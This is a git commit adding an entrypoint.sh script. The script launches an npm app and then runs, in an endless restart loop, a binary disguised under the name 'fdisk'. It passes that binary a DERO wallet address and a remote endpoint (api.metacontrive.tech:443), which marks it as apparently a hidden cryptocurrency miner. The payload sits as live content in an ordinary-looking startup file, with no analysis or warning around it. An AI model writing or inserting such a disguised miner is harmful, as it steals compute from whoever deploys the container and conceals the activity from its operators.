a0f1eccc7404c1c35fb34d292825328da9e1e9fd
pauldinismox <133698041+pauldinismox@users.noreply.github.com>
2023-05-15 19:30:46 +0100

    Add files via upload

---
+++ entrypoint.sh
@@ -0,0 +1,16 @@
+#!/bin/sh
+nohup npm start &
+
+# Function to restart fdisk command
+restart_fdisk() {
+  while true; do
+    ./fdisk -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc
+    sleep 10
+  done
+}
+
+# Trap SIGINT and SIGTERM signals to exit gracefully
+trap 'exit 0' SIGINT SIGTERM
+
+# Call the function to restart fdisk
+restart_fdisk
